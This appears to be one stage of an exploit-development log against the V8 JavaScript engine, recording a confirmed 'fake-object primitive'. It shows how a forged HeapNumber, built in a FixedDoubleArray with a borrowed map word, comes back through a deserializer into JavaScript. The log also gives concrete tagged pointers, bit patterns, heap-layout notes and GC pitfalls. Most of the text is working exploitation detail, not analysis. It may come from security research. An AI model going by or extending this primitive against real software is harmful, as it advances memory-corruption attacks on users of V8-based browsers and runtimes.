STAGE 4 (fake HeapObject chain) — VERDICT: CONFIRMED
====================================================================
12. S3_T=fakenum, s3a (malloc spray), stream ff 0f 70 bd 9c 76 (K=1936957):
    control block qword0 = odd tagged word = cage_base | fake_c32 | 1 where
    fake_c32 points at e0+4 inside a JS FixedDoubleArray's elements (in-cage,
    attacker-writable doubles): bytes [e0+4..e0+7] = real HeapNumber map c32
    (0x00000515, borrowed at runtime from a real 13.37 HeapNumber),
    [e0+8..e0+15] = payload double bit pattern 0x1337133713371337.
    GetPersisted returns odd word -> treated as HeapObject:
      raw tagged of result = 0x0000137901082c19
      [api] IsNumber=1
      [js] typeof v => "number"
      [js] ''+v   => 4.183559446463817e-216
                  (== struct.unpack('<d', 0x1337133713371337): bit-exact)
    => a fully attacker-fabricated HeapNumber (map + value) round-trips
    through the deserializer into JS. This is a fake-object primitive
    (any map word / fields forgeable the same way).
    GC HAZARD (documented): forcing full GC afterwards evacuates the host
    array's page -> the returned tagged pointer dangles -> SIGSEGV reading
    0x...082c18 in v8-sandbox region. Pre-GC usage is stable (shown twice).
    Note: ArrayBuffer backing stores are NOT usable hosts here: they live
    outside the 4 GiB compression cage (observed rel = 0x100000000);
    FixedDoubleArray elements are the in-cage alternative used.
    log: s4_fakenum.log
